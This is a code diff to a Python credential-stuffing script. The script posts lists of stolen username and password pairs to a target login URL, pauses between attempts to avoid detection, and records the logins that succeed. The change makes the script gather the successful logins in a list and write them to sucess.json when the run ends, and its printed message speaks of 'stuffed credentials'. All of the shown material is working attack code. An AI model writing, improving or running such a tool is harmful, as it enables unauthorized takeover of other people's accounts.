@@ -19,7 +19,7 @@ credentials = json.load(open('credentials.json'))
 
 print('Starting attack on ' + requestURL)
 
-outFile = open('sucess.json', 'w', encoding='utf-8')
+sucessList = []
 
 #post each credential
 for credential in credentials:
@@ -35,8 +35,13 @@ for credential in credentials:
     	#look for a sucessful login
     	if sucessKey in response.text:
     	    print('sucess')
-    	    json.dump(credObj, outFile, ensure_ascii=False, indent=4)
+    	    sucessList.append(credObj)
+
     #delay before proceeding to next credential
     time.sleep(requestDelay)
-    
+
+#write sucessful creds to a file in json format
+print("writing suceffuly stuffed credentials to sucess.json\nexiting...")
+outFile = open('sucess.json', 'w', encoding='utf-8')
+json.dump(sucessList, outFile, ensure_ascii=False, indent=4)
 outFile.close
